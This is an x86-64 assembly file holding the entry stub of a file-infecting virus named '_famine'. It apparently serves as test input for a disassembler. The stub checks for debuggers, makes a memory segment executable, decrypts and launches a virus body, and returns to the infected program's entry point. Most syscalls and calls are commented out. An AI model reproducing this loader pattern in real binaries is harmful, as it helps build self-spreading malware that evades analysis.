
; nasm -fmacho64 get_opcode.s && gcc -fsanitize=address -c main.c disasm.c disasm_length.c && gcc -fsanitize=address get_opcode.o main.o disasm.o disasm_length.o

section .text
global _famine

_famine:
; %ifdef DEBUG
	; mov rax, 0x00000a2e2e2e2e59
	push rax
	; mov rax, 0x444f4f572e2e2e2e
	push rax

	; write(1, "....WOODY....\n", 14);
	mov rdi, 0;STDOUT
	mov rsi, rsp
	mov rdx, 14
	mov rax, 3;SYSCALL_WRITE
	; syscall

	add rsp, 16
; %endif
;------------------------------; check if client behaves well (comment for debug)
	; call detect_spy
	test rax, rax
	; jnz return_to_client
;------------------------------; make ptld writable
	mov r8, [rsp + 32]         ; get ptld addr
	mov r9, [rsp + 24]         ; get ptld len

	;mprotect(ptld_addr, ptld_size, PROT_READ | PROT_WRITE | PROT_EXEC);

	mov rdi, r8
	mov rsi, r9
	mov rdx, 0;PROT_RWX
	mov rax, 1;SYSCALL_MPROTECT
	; syscall
;------------------------------; decypher virus
	mov rdi, [rsp + 16]        ; get virus_addr
	mov rsi, r14               ; get virus_size

	; call decypher
;------------------------------; launch virus
	mov rdi, [rsp]             ; get seed
	; call virus
;------------------------------; return to client entry
; return_to_client:
	mov r11, [rsp + 8]         ; get entry addr
	add rsp, 48                ; restore stack as it was
	pop r14                    ; restore r14
	pop rdx                    ; restore rdx
	push r11
	; ret
